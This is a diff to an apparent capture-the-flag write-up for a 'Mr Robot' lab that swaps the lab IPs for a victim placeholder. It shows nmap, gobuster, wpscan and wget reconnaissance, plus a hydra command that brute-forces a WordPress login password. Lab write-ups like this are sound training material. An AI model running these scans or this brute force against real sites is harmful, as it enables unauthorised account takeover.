@@ -12,9 +12,9 @@ Difficulty: **Medium**
 Running an initial scan against all ports shows ports 22 (SSH), 80 (HTTP), and 443 (HTTPS) responded with only HTTP/S ports open.
 
 ```console
-$ nmap -p- -T4 10.10.255.60 -oN scans/initial.nmap
+$ nmap -p- -T4 <VICTIM IP> -oN scans/initial.nmap
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 17:42 GMT
-Nmap scan report for 10.10.255.60
+Nmap scan report for <VICTIM IP>
 Host is up (0.033s latency).
 Not shown: 65532 filtered tcp ports (no-response)
 PORT    STATE  SERVICE
@@ -28,9 +28,9 @@ Nmap done: 1 IP address (1 host up) scanned in 93.07 seconds
 Taking these ports and running a full scan shows the host is running a version of Apache on a Linux host:
 
 ```console
-$ nmap -p 22,80,443 -A -T4 10.10.255.60 -oN scans/open_ports.nmap
+$ nmap -p 22,80,443 -A -T4 <VICTIM IP> -oN scans/open_ports.nmap
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 17:46 GMT
-Nmap scan report for 10.10.255.60
+Nmap scan report for <VICTIM IP>
 Host is up (0.031s latency).
 
 PORT    STATE  SERVICE  VERSION
@@ -54,7 +54,7 @@ Network Distance: 2 hops
 TRACEROUTE (using port 22/tcp)
 HOP RTT      ADDRESS
 1   27.26 ms 10.9.0.1
-2   31.80 ms 10.10.255.60
+2   31.80 ms <VICTIM IP>
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 22.08 seconds
@@ -67,7 +67,7 @@ Navigating to the website, we see that it is running a simulated terminal:
 While we manually crawl the website, we can run Gobuster which, when complete, indicates that the website is running Wordpress as its CMS (Content Management System):
 
 ```console
-$ gobuster dir -u http://10.10.255.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+$ gobuster dir -u http://<VICTIM IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 ![Mr Robot - Gobuster](/images/mrrobot_gobuster.png)
@@ -75,7 +75,7 @@ $ gobuster dir -u http://10.10.255.60/ -w /usr/share/wordlists/dirbuster/directo
 As such, we can run `wpscan` against the site. From this we find a `robots.txt` file:
 
 ```console
-$ wpscan --url http://10.10.255.60
+$ wpscan --url http://<VICTIM IP>
 ```
 
 ![Mr Robot - WPScan](/images/mrrobot_wpscan.png)
@@ -87,8 +87,8 @@ Accessing `/robots.txt` shows two files are listed, namely `fsocity.dic` and `ke
 Downloading the files:
 
 ```console
-$ wget http://10.10.90.179/fsocity.dic
-$ wget http://10.10.90.179/key-1-of-3.txt
+$ wget http://<VICTIM IP>/fsocity.dic
+$ wget http://<VICTIM IP>/key-1-of-3.txt
 ```
 
 Viewing these files we successfully get **key 1** and a dictionary which we can use against the login form at `/wp-login.php`.
@@ -138,7 +138,7 @@ To summarise, the `hydra` command:
 Now we have the username, `Elliot`, we can use the same technique to get the password:
 
 ```console
-$ hydra -l Elliot -P fsocity_filtered.dic 10.10.90.179 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username' -t 30
+$ hydra -l Elliot -P fsocity_filtered.dic <VICTIM IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username' -t 30
 ```
 
 ![Mr Robot - Hydra Password](/images/mrrobot_hydra_password.png)
